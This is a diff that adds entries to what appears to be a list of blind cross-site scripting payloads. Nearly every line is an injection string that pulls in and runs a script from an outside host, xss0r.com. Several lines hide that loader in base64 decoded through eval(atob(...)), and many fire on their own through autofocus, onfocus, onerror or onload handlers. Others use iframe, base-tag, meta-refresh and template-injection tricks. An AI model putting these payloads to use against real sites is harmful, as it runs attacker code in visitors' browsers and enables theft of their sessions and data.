@@ -164,3 +164,14 @@ ibro1337@gmail.com<!--" --><script src=https://xss0r.com/c/lostsec></script>
 <div onclick="let u='https://xss0r.com/c/'.concat('lostsec');fetch(u).then(r=>r.text()).then(eval)">Click me</div>
 "><div contenteditable autofocus onfocusin="document.body.appendChild(document.createElement('script')).src='https://xss0r.com/c/lostsec'">Click me!</div>
 "><div autofocus contenteditable onfocusin="document.body.appendChild(document.createElement('script')).src='https://xss0r.com/c/lostsec'">Focus here</div>
+'"><svg onload="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0naHR0cHM6Ly94c3Mwci5jb20vYy9sb3N0c2VjL3NjcmlwdC5qcyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs=">
+const x=document.createElement('script');x.src='https://xss0r.com/c/lostsec/script.js';document.body.appendChild(x);
+'"><img src="https://xss0r.com/c/lostsec/img.png">
+'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0naHR0cHM6Ly94c3Mwci5jb20vYy9sb3N0c2VjL3NjcmlwdC5qcyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs=">
+'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0naHR0cHM6Ly94c3Mwci5jb20vYy9sb3N0c2VjL3NjcmlwdC5qcyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs=">
+'"><script>$.getScript("https://xss0r.com/c/lostsec/script.js")</script>
+javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0naHR0cHM6Ly94c3Mwci5jb20vYy9sb3N0c2VjL3NjcmlwdC5qcyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs="))
+'"><iframe src="https://xss0r.com/c/lostsec"></iframe>
+<base href="https://xss0r.com/c/lostsec"/>
+<meta http-equiv="refresh" content="0; url=https://xss0r.com/c/lostsec"/>
+{{constructor.constructor("import('https://xss0r.com/c/lostsec/script.js')")()}}
